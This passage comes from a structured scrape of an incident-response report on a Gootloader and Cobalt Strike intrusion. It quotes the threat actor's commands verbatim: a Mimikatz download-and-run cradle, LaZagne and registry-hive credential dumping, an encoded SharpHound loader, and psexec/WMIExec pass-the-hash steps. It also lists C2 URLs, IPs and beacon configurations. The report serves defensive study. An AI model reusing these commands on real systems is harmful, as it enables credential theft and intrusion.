                    "html": " CyberChef recipe can be used to decode the inner encoded command.\n \nThe output lists \u201cInvoke-Mimikatz\u201d, a direct reference to the PowerShell Invoke-Mimikatz.ps1 script used to load Mimikatz DLL directly in memory.\n \n$u=('http://127.0.0.1:22201/'|%{(IRM $_)});$u|&(GCM I*e-E*); Import-Module C:\\Users\\<redacted>\\mi.ps1; Invoke-Mimikatz -ComputerName <redacted>\nMonitoring PowerShell event id 4103 we can observe the threat actor\u2019s successful credential access activity from the Mimikatz invocation.\n \n"
                },
                {
                    "id": "<sentence_0x5e2966af>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<a href=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-20.png\"><img alt=\"\" class=\"aligncenter size-full wp-image-6771 jetpack-lazy-image\" height=\"876\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-20.png\" width=\"1202\"/><img alt=\"\" class=\"aligncenter size-full wp-image-6771\" height=\"876\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-20.png\" width=\"1202\"/></a>"
                },
                {
                    "id": "<sentence_0xae6c3c08>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "In addition, the post-exploitation tool",
                    "html": "\n \nIn addition, the post-exploitation tool \u201c"
                },
                {
                    "id": "<sentence_0xcbdb1cf4>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xa4f1078f>": "https://github.com/AlessandroZ/LaZagne"
                    },
                    "text": "LaZagne",
                    "html": "<a class=\"ql-link\" href=\"https://github.com/AlessandroZ/LaZagne\" rel=\"noopener noreferrer\" target=\"_blank\">LaZagne</a>"
                },
                {
                    "id": "<sentence_0x6f941464>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "(renamed to ls.exe) was used with the -all switch.<crlf>ls.exe all -oN -output C:\\Users\\REDACTED<crlf>This will dump passwords (browsers, LSA secret, hashdump, Keepass, WinSCP, RDPManager, OpenVPN, Git, etc.) and store the output file (in our case) in the C:\\Users directory. When LaZagne is run with admin privileges, it also attempts to dump credentials from local registry hives, as can be seen below.",
                    "html": "\u201d (renamed to ls.exe) was used with the \u201c-all\u201d switch.\nls.exe all -oN -output C:\\Users\\REDACTED\nThis will dump passwords (browsers, LSA secret, hashdump, Keepass, WinSCP, RDPManager, OpenVPN, Git, etc.) and store the output file (in our case) in the \u201cC:\\Users\u201d directory. When LaZagne is run with admin privileges, it also attempts to dump credentials from local registry hives, as can be seen below.\n \n"
                },
                {
                    "id": "<sentence_0x638e38d5>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<a href=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-21.png\"><img alt=\"\" class=\"aligncenter size-full wp-image-6773 jetpack-lazy-image\" height=\"133\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-21.png\" width=\"1131\"/><img alt=\"\" class=\"aligncenter size-full wp-image-6773\" height=\"133\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-21.png\" width=\"1131\"/></a>"
                },
                {
                    "id": "<sentence_0x9cd1c75a>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Heres the commands from another system:<crlf>cmd.exe /c \"reg.exe save hklm\\sam c:\\users\\REDACTED\\appdata\\local\\temp\\1\\dznuxujzr\"<crlf>cmd.exe /c \"reg.exe save hklm\\system c:\\users\\REDACTED\\appdata\\local\\temp\\1\\mkffdg\"<crlf>cmd.exe /c \"reg.exe save hklm\\security c:\\users\\REDACTED\\appdata\\local\\temp\\1\\iszmqwmjemt\"",
                    "html": "\n \nHere\u2019s the commands from another system:\ncmd.exe /c \"reg.exe save hklm\\sam c:\\users\\REDACTED\\appdata\\local\\temp\\1\\dznuxujzr\"\ncmd.exe /c \"reg.exe save hklm\\system c:\\users\\REDACTED\\appdata\\local\\temp\\1\\mkffdg\"\ncmd.exe /c \"reg.exe save hklm\\security c:\\users\\REDACTED\\appdata\\local\\temp\\1\\iszmqwmjemt\"\n"
                }
            ]
        },
        {
            "id": "<chapter_0x5ec700d7>",
            "title": "Discovery",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0x38dec2f6>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The threat actors used the PowerShell implementation of SharpHound (Bloodhound) on the beachhead host to enumerate the Active Directory domain. The Cobalt Strike beacon was used to invoke the PowerShell script.<crlf><crlf>powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAxADAAMAA0ADkALwAnACkAOwAgAEkAbgB2AG8AawBlAC0AQgBsAG8AbwBkAEgAbwB1AG4AZAAgAC0AQwBvAGwAbABlAGMAdABpAG8AbgBNAGUAdABoAG8AZAAgAEEAbABsAA==",
                    "html": "\nThe threat actors used the PowerShell implementation of SharpHound (Bloodhound) on the beachhead host to enumerate the Active Directory domain. The Cobalt Strike beacon was used to invoke the PowerShell script.\n \npowershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAxADAAMAA0ADkALwAnACkAOwAgAEkAbgB2AG8AawBlAC0AQgBsAG8AbwBkAEgAbwB1AG4AZAAgAC0AQwBvAGwAbABlAGMAdABpAG8AbgBNAGUAdABoAG8AZAAgAEEAbABsAA==\n"
                },
                {
                    "id": "<sentence_0x2f43de3f>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0xad40895c>": "https://thedfirreport.com/wp-content/uploads/2022/05/12222.png"
                    },
                    "text": "",
                    "html": "<img alt=\"\" class=\"alignnone size-full wp-image-6813 jetpack-lazy-image\" height=\"343\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/12222.png\" width=\"1532\"/>"
                },
                {
                    "id": "<sentence_0xcaf914>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0xad40895c>": "https://thedfirreport.com/wp-content/uploads/2022/05/12222.png"
                    },
                    "text": "",
                    "html": "<img alt=\"\" class=\"alignnone size-full wp-image-6813\" height=\"343\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/12222.png\" width=\"1532\"/>"
                },
                {
                    "id": "<sentence_0x8b9282dd>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "They also ran a WMI command on the beachhead host and one other host to check for AntiVirus.",
                    "html": "\n \nThey also ran a WMI command on the beachhead host and one other host to check for AntiVirus.\n \n"
                },
                {
                    "id": "<sentence_0xfd9f081>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<code_0xfccd930e>": "WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List"
                    },
                    "text": "",
                    "html": "<code>WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List</code>"
                },
                {
                    "id": "<sentence_0xd0122c30>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The threat actors executed this command remotely on a domain controller, before moving laterally to it:<crlf>powershell.exe ls C:\\ > C:\\file.txt<crlf>While having an interactive RDP session, in an attempt to collect more information regarding the host, the attackers used PowerShell to run systeminfo on one of the hosts they pivoted to.<crlf><crlf>On the last day, and before they left the network, threat actors used Advanced IP Scanner to scan the whole network for the below open ports:<crlf>21,80,135,443,445,3389,8080,56133,58000,58157,58294,58682,60234,60461,64502",
                    "html": "\nThe threat actors executed this command remotely on a domain controller, before moving laterally to it:\npowershell.exe ls C:\\ > C:\\file.txt\nWhile having an interactive RDP session, in an attempt to collect more information regarding the host, the attackers used PowerShell to run systeminfo on one of the hosts they pivoted to.\n \nOn the last day, and before they left the network, threat actors used Advanced IP Scanner to scan the whole network for the below open ports:\n21,80,135,443,445,3389,8080,56133,58000,58157,58294,58682,60234,60461,64502\n"
                },
                {
                    "id": "<sentence_0xbdd3a44c>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0x65a6632>": "https://thedfirreport.com/wp-content/uploads/2022/05/123.png"
                    },
                    "text": "",
                    "html": "<img alt=\"\" class=\"alignnone size-full wp-image-6809 jetpack-lazy-image\" height=\"396\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/123.png\" width=\"1704\"/>"
                },
                {
                    "id": "<sentence_0x4aab835d>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0x65a6632>": "https://thedfirreport.com/wp-content/uploads/2022/05/123.png"
                    },
                    "text": "",
                    "html": "<img alt=\"\" class=\"alignnone size-full wp-image-6809\" height=\"396\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/123.png\" width=\"1704\"/>"
                }
            ]
        },
        {
            "id": "<chapter_0xdade7bb9>",
            "title": "Lateral Movement",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0xe0b390d5>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0xf6afd27b>": "https://thedfirreport.com/wp-content/uploads/2022/05/Lateral-Movement.png"
                    },
                    "text": "",
                    "html": "<p><img alt=\"\" class=\"size-full wp-image-6815 aligncenter jetpack-lazy-image\" height=\"494\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/Lateral-Movement.png\" width=\"1388\"/><img alt=\"\" class=\"size-full wp-image-6815 aligncenter\" height=\"494\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/Lateral-Movement.png\" width=\"1388\"/></p>"
                },
                {
                    "id": "<sentence_0x53de1fbf>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "As observed in many of our intrusions, the threat actor created and installed Windows services to deploy Cobalt Strike beacons. This method was used to pivot to other systems within the network.",
                    "html": "\nAs observed in many of our intrusions, the threat actor created and installed Windows services to deploy Cobalt Strike beacons. This method was used to pivot to other systems within the network.\n \n"
                },
                {
                    "id": "<sentence_0xb5b863e2>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<a href=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-24.png\"><img alt=\"\" class=\"aligncenter size-full wp-image-6775 jetpack-lazy-image\" height=\"858\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-24.png\" width=\"1740\"/><img alt=\"\" class=\"aligncenter size-full wp-image-6775\" height=\"858\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-24.png\" width=\"1740\"/></a>"
                },
                {
                    "id": "<sentence_0x619623b5>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "SMB was also used to transfer executable Cobalt Strike beacons to various workstations in the environment.",
                    "html": "\n \nSMB was also used to transfer executable Cobalt Strike beacons to various workstations in the environment.\n \n"
                },
                {
                    "id": "<sentence_0xbbb4dd64>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<a href=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-25.png\"><img alt=\"\" class=\"aligncenter size-full wp-image-6776 jetpack-lazy-image\" height=\"258\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-25.png\" width=\"890\"/><img alt=\"\" class=\"aligncenter size-full wp-image-6776\" height=\"258\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-25.png\" width=\"890\"/></a>"
                },
                {
                    "id": "<sentence_0x5be15813>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "These executables were then executed by a remote service visible in the windows event id 7045 logs.",
                    "html": "\n \nThese executables were then executed by a remote service visible in the windows event id 7045 logs.\n \n"
                },
                {
                    "id": "<sentence_0xda485aa2>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<a href=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-26.png\"><img alt=\"\" class=\"aligncenter size-full wp-image-6777 jetpack-lazy-image\" height=\"146\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-26.png\" width=\"478\"/><img alt=\"\" class=\"aligncenter size-full wp-image-6777\" height=\"146\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-26.png\" width=\"478\"/></a>"
                },
                {
                    "id": "<sentence_0xe3abe2ce>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Next to deploying Cobalt Strike beacons, the threat actor also used RDP to establish interactive sessions with various hosts on the network. One important aspect of these sessions is that the threat actor authenticated using Restricted Admin Mode.<crlf><crlf>Restricted Admin Mode can be considered a double-edged sword; although it prevents credential theft, it also enables an attacker to perform a pass-the-hash attack using RDP. In other words, after enabling Restricted Admin Mode, just the NTLM hash of the remote desktop user is required to establish a valid RDP session, without the need of possessing the clear password.<crlf><crlf>The threat actor attempted to use both Invoke-WMIExec and psexec to enable Restricted Admin Mode.<crlf><crlf>psexec \\\\<redacted> -u <redacted>\\<redacted> -p <redacted> reg add \"hklm\\system\\currentcontrolset\\control\\lsa\" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0<crlf>powershell -nop -noni -ep bypass -w h -c \"$u=('http://127.0.0.1:47961/'|%%{(IRM $_)});&(''.SubString.ToString()[67,72,64]-Join'')($u); Import-Module C:\\Users\\<redacted>\\Invoke-WMIExec.ps1; Invoke-WMIExec -Target <redacted> -Domain <redacted> -Username <redacted> -Hash <redacted> -Command \"powershell.exe New-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa' -Name 'DisableRestrictedAdmin' -Value 0 -PropertyType DWORD\" -verbose\"<crlf>The logon information of EventID 4624 includes a field Restricted Admin Mode, which is set to the value Yes if the feature is used.",
                    "html": "\n \nNext to deploying Cobalt Strike beacons, the threat actor also used RDP to establish interactive sessions with various hosts on the network. One important aspect of these sessions is that the threat actor authenticated using \u201cRestricted Admin Mode\u201d.\n \nRestricted Admin Mode can be considered a double-edged sword; although it prevents credential theft, it also enables an attacker to perform a pass-the-hash attack using RDP. In other words, after enabling Restricted Admin Mode, just the NTLM hash of the remote desktop user is required to establish a valid RDP session, without the need of possessing the clear password.\n \nThe threat actor attempted to use both Invoke-WMIExec and psexec to enable \u201cRestricted Admin Mode\u201d.\n \npsexec \\\\<redacted> -u <redacted>\\<redacted> -p <redacted> reg add \"hklm\\system\\currentcontrolset\\control\\lsa\" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0\npowershell -nop -noni -ep bypass -w h -c \"$u=('http://127.0.0.1:47961/'|%%{(IRM $_)});&(''.SubString.ToString()[67,72,64]-Join'')($u); Import-Module C:\\Users\\<redacted>\\Invoke-WMIExec.ps1; Invoke-WMIExec -Target <redacted> -Domain <redacted> -Username <redacted> -Hash <redacted> -Command \"powershell.exe New-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa' -Name 'DisableRestrictedAdmin' -Value 0 -PropertyType DWORD\" -verbose\"\nThe logon information of EventID 4624 includes a field \u201cRestricted Admin Mode\u201d, which is set to the value \u201cYes\u201d if the feature is used.\n \n"
                },
                {
                    "id": "<sentence_0x8c4fbc7b>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<a href=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-27.png\"><img alt=\"\" class=\"aligncenter size-full wp-image-6778 jetpack-lazy-image\" height=\"1031\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-27.png\" width=\"633\"/><img alt=\"\" class=\"aligncenter size-full wp-image-6778\" height=\"1031\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-27.png\" width=\"633\"/></a>"
                }
            ]
        },
        {
            "id": "<chapter_0x3c59403e>",
            "title": "Collection",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0x4df7a867>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The threat actor accessed multiple files during the RDP sessions on multiple servers. In one instance document files were opened directly on the system.",
                    "html": "\nThe threat actor accessed multiple files during the RDP sessions on multiple servers. In one instance document files were opened directly on the system.\n \n"
                },
                {
                    "id": "<sentence_0x32f95fee>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0x56d3bbf6>": "https://thedfirreport.com/wp-content/uploads/2022/05/2.png"
                    },
                    "text": "",
                    "html": "<img alt=\"\" class=\"alignnone size-full wp-image-6799 jetpack-lazy-image\" height=\"115\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/2.png\" width=\"1191\"/>"
                },
                {
                    "id": "<sentence_0x3bc840b5>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0x56d3bbf6>": "https://thedfirreport.com/wp-content/uploads/2022/05/2.png"
                    },
                    "text": "",
                    "html": "<img alt=\"\" class=\"alignnone size-full wp-image-6799\" height=\"115\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/2.png\" width=\"1191\"/>"
                },
                {
                    "id": "<sentence_0xdebbfd07>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Shellbags reveled attempts to enumerate multiple file shares containing information of interest to the threat actor.",
                    "html": "\n \nShellbags reveled attempts to enumerate multiple file shares containing information of interest to the threat actor.\n \n"
                },
                {
                    "id": "<sentence_0x2f59ccc0>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0xb479cf7a>": "https://thedfirreport.com/wp-content/uploads/2022/05/1.png"
                    },
                    "text": "",
                    "html": "<img alt=\"\" class=\"alignnone size-full wp-image-6798 jetpack-lazy-image\" height=\"225\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/1.png\" width=\"565\"/>"
                },
                {
                    "id": "<sentence_0x74498ae5>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0xb479cf7a>": "https://thedfirreport.com/wp-content/uploads/2022/05/1.png"
                    },
                    "text": "",
                    "html": "<img alt=\"\" class=\"alignnone size-full wp-image-6798\" height=\"225\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/1.png\" width=\"565\"/>"
                }
            ]
        },
        {
            "id": "<chapter_0x7f35ac30>",
            "title": "Command and Control",
            "title_level": 2,
            "sentences": []
        },
        {
            "id": "<chapter_0x5f7e74b8>",
            "title": "Gootloader",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0xd15cbceb>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Gootloader second stage download URLs. These URLs were deobfuscated and extracted using",
                    "html": "\nGootloader second stage download URLs. These URLs were deobfuscated and extracted using "
                },
                {
                    "id": "<sentence_0x79f0a85b>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xe6be88af>": "https://github.com/hpthreatresearch/tools/blob/main/gootloader/decode.py"
                    },
                    "text": "this",
                    "html": "<a class=\"ql-link\" href=\"https://github.com/hpthreatresearch/tools/blob/main/gootloader/decode.py\" rel=\"noopener noreferrer\" target=\"_blank\">this</a>"
                },
                {
                    "id": "<sentence_0x746a1784>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "script by",
                    "html": " script by "
                },
                {
                    "id": "<sentence_0xafd9dc59>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x36773290>": "https://twitter.com/HPSecurity"
                    },
                    "text": "HP Threat Research",
                    "html": "<a href=\"https://twitter.com/HPSecurity\">HP Threat Research</a>"
                },
                {
                    "id": "<sentence_0x10e1af99>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": ". Theyve updated this script at least a few times now, thanks",
                    "html": ". They\u2019ve updated this script at least a few times now, thanks "
                },
                {
                    "id": "<sentence_0x81a149f7>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x36773290>": "https://twitter.com/HPSecurity"
                    },
                    "text": "@hpsecurity",
                    "html": "<a href=\"https://twitter.com/HPSecurity\">@hpsecurity</a>"
                },
                {
                    "id": "<sentence_0xccb87cd2>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "and thanks to",
                    "html": " and thanks to "
                },
                {
                    "id": "<sentence_0x6054d6f8>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xd9ebc9ae>": "https://twitter.com/GootLoaderSites"
                    },
                    "text": "@GootLoaderSites",
                    "html": "<a href=\"https://twitter.com/GootLoaderSites\">@GootLoaderSites</a>"
                },
                {
                    "id": "<sentence_0xa486aea0>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "for sharing on twitter as its broken/fixed.<crlf>hxxps://kakiosk.adsparkdev[.]com/test.php?hjkiofilihyl=<crlf>hxxps://jp.imonitorsoft[.]com/test.php?hjkiofilihyl=<crlf>hxxps://junk-bros[.]com/test.php?hjkiofilihyl=<crlf>During the intrusion the Gootloader loader was observed communicating to 35.206.117.64:443 kakiosk[.]adsparkdev[.]com.<crlf>Ja3:a0e9f5d64349fb13191bc781f81f42e1<crlf>Ja3s:567bb420d39046dbfd1f68b558d86382<crlf>Certificate: [d8:85:d1:48:a2:99:f5:ee:9d:a4:3e:01:1c:b0:ec:12:e5:23:7d:61 ]<crlf>Not Before: 2022/01/05 09:25:33 UTC<crlf>Not After: 2022/04/05 09:25:32 UTC<crlf>Issuer Org: Let's Encrypt<crlf>Subject Common: kakiosk.adsparkdev.com [kakiosk.adsparkdev.com ,www.kakiosk.adsparkdev.com ]<crlf>Public Algorithm: rsaEncryption",
                    "html": " for sharing on twitter as its broken/fixed.\nhxxps://kakiosk.adsparkdev[.]com/test.php?hjkiofilihyl=\nhxxps://jp.imonitorsoft[.]com/test.php?hjkiofilihyl=\nhxxps://junk-bros[.]com/test.php?hjkiofilihyl=\nDuring the intrusion the Gootloader loader was observed communicating to 35.206.117.64:443 kakiosk[.]adsparkdev[.]com.\nJa3:a0e9f5d64349fb13191bc781f81f42e1\nJa3s:567bb420d39046dbfd1f68b558d86382\nCertificate: [d8:85:d1:48:a2:99:f5:ee:9d:a4:3e:01:1c:b0:ec:12:e5:23:7d:61 ]\nNot Before: 2022/01/05 09:25:33 UTC \nNot After: 2022/04/05 09:25:32 UTC \nIssuer Org: Let's Encrypt \nSubject Common: kakiosk.adsparkdev.com [kakiosk.adsparkdev.com ,www.kakiosk.adsparkdev.com ]\nPublic Algorithm: rsaEncryption\n"
                }
            ]
        },
        {
            "id": "<chapter_0x18606d17>",
            "title": "Cobalt Strike",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0xe031289b>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "146.70.78.43<crlf>Cobalt Strike server TLS configuration:<crlf>146.70.78.43<crlf>Ja3:72a589da586844d7f0818ce684948eea<crlf>Ja3s:f176ba63b4d68e576b5ba345bec2c7b7<crlf>Serial Number: 146473198 (0x8bb00ee)<crlf>Certificate: 73:6B:5E:DB:CF:C9:19:1D:5B:D0:1F:8C:E3:AB:56:38:18:9F:02:4F<crlf>Not Before: May 20 18:26:24 2015 GMT<crlf>Not After: May 17 18:26:24 2025 GMT<crlf>Issuer: C=, ST=, L=, O=, OU=, CN=<crlf>Subject: C=, ST=, L=, O=, OU=, CN=<crlf>Public Algorithm: rsaEncryption<crlf>Cobalt Strike beacon configuration:<crlf>Cobalt Strike Beacon:<crlf>x86:<crlf>beacon_type: HTTPS<crlf>dns-beacon.strategy_fail_seconds: -1<crlf>dns-beacon.strategy_fail_x: -1<crlf>dns-beacon.strategy_rotate_seconds: -1<crlf>http-get.client:<crlf>Cookie<crlf>http-get.uri: 146.70.78.43,/visit.js<crlf>http-get.verb: GET<crlf>http-post.client:<crlf>Content-Type: application/octet-stream<crlf>id<crlf>http-post.uri: /submit.php<crlf>http-post.verb: POST<crlf>maxgetsize: 1048576<crlf>port: 443<crlf>post-ex.spawnto_x64: %windir%\\sysnative\\rundll32.exe<crlf>post-ex.spawnto_x86: %windir%\\syswow64\\rundll32.exe<crlf>process-inject.execute:<crlf>CreateThread<crlf>SetThreadContext<crlf>CreateRemoteThread<crlf>RtlCreateUserThread<crlf>process-inject.startrwx: 64<crlf>process-inject.stub: 222b8f27dbdfba8ddd559eeca27ea648<crlf>process-inject.userwx: 64<crlf>proxy.behavior: 2 (Use IE settings)<crlf>server.publickey_md5: defb5d95ce99e1ebbf421a1a38d9cb64<crlf>sleeptime: 60000<crlf>useragent_header: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; yie9)<crlf>uses_cookies: 1<crlf>watermark: 1580103824<crlf>x64:<crlf>beacon_type: HTTPS<crlf>dns-beacon.strategy_fail_seconds: -1<crlf>dns-beacon.strategy_fail_x: -1<crlf>dns-beacon.strategy_rotate_seconds: -1<crlf>http-get.client:<crlf>Cookie<crlf>http-get.uri: 146.70.78.43,/fwlink<crlf>http-get.verb: GET<crlf>http-post.client:<crlf>Content-Type: application/octet-stream<crlf>id<crlf>http-post.uri: /submit.php<crlf>http-post.verb: POST<crlf>maxgetsize: 1048576<crlf>port: 443<crlf>post-ex.spawnto_x64: %windir%\\sysnative\\rundll32.exe<crlf>post-ex.spawnto_x86: %windir%\\syswow64\\rundll32.exe<crlf>process-inject.execute:<crlf>CreateThread<crlf>SetThreadContext<crlf>CreateRemoteThread<crlf>RtlCreateUserThread<crlf>process-inject.startrwx: 64<crlf>process-inject.stub: 222b8f27dbdfba8ddd559eeca27ea648<crlf>process-inject.userwx: 64<crlf>proxy.behavior: 2 (Use IE settings)<crlf>server.publickey_md5: defb5d95ce99e1ebbf421a1a38d9cb64<crlf>sleeptime: 60000<crlf>useragent_header: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ENXA)<crlf>uses_cookies: 1<crlf>watermark: 1580103824<crlf>37.120.198.225<crlf>Cobalt Strike server TLS configuration:<crlf>Ja3:72a589da586844d7f0818ce684948eea<crlf>Ja3s:f176ba63b4d68e576b5ba345bec2c7b7<crlf>Serial Number: 146473198 (0x8bb00ee)<crlf>Certificate: 73:6B:5E:DB:CF:C9:19:1D:5B:D0:1F:8C:E3:AB:56:38:18:9F:02:4F<crlf>Not Before: May 20 18:26:24 2015 GMT<crlf>Not After : May 17 18:26:24 2025 GMT<crlf>Issuer: C=, ST=, L=, O=, OU=, CN=<crlf>Subject: C=, ST=, L=, O=, OU=, CN=<crlf>Public Algorithm: rsaEncryption<crlf>Cobalt Strike beacon configuration:<crlf>Cobalt Strike Beacon:<crlf>x86:<crlf>beacon_type: HTTPS<crlf>dns-beacon.strategy_fail_seconds: -1<crlf>dns-beacon.strategy_fail_x: -1<crlf>dns-beacon.strategy_rotate_seconds: -1<crlf>http-get.client:<crlf>Cookie<crlf>http-get.uri: 37.120.198.225,/cm<crlf>http-get.verb: GET<crlf>http-post.client:<crlf>Content-Type: application/octet-stream<crlf>id<crlf>http-post.uri: /submit.php<crlf>http-post.verb: POST<crlf>maxgetsize: 1048576<crlf>port: 443<crlf>post-ex.spawnto_x64: %windir%\\sysnative\\rundll32.exe<crlf>post-ex.spawnto_x86: %windir%\\syswow64\\rundll32.exe<crlf>process-inject.execute:<crlf>CreateThread<crlf>SetThreadContext<crlf>CreateRemoteThread<crlf>RtlCreateUserThread<crlf>process-inject.startrwx: 64<crlf>process-inject.stub: 222b8f27dbdfba8ddd559eeca27ea648<crlf>process-inject.userwx: 64<crlf>proxy.behavior: 2 (Use IE settings)<crlf>server.publickey_md5: defb5d95ce99e1ebbf421a1a38d9cb64<crlf>sleeptime: 60000<crlf>useragent_header: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ENUSMSE)<crlf>uses_cookies: 1<crlf>watermark: 1580103824<crlf>x64:<crlf>beacon_type: HTTPS<crlf>dns-beacon.strategy_fail_seconds: -1<crlf>dns-beacon.strategy_fail_x: -1<crlf>dns-beacon.strategy_rotate_seconds: -1<crlf>http-get.client:<crlf>Cookie<crlf>http-get.uri: 37.120.198.225,/ptj<crlf>http-get.verb: GET<crlf>http-post.client:<crlf>Content-Type: application/octet-stream<crlf>id<crlf>http-post.uri: /submit.php<crlf>http-post.verb: POST<crlf>maxgetsize: 1048576<crlf>port: 443<crlf>post-ex.spawnto_x64: %windir%\\sysnative\\rundll32.exe<crlf>post-ex.spawnto_x86: %windir%\\syswow64\\rundll32.exe<crlf>process-inject.execute:<crlf>CreateThread<crlf>SetThreadContext<crlf>CreateRemoteThread<crlf>RtlCreateUserThread<crlf>process-inject.startrwx: 64<crlf>process-inject.stub: 222b8f27dbdfba8ddd559eeca27ea648<crlf>process-inject.userwx: 64<crlf>proxy.behavior: 2 (Use IE settings)<crlf>server.publickey_md5: defb5d95ce99e1ebbf421a1a38d9cb64<crlf>sleeptime: 60000<crlf>useragent_header: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts; IE0006_ver1;EN_GB)<crlf>uses_cookies: 1<crlf>watermark: 1580103824",
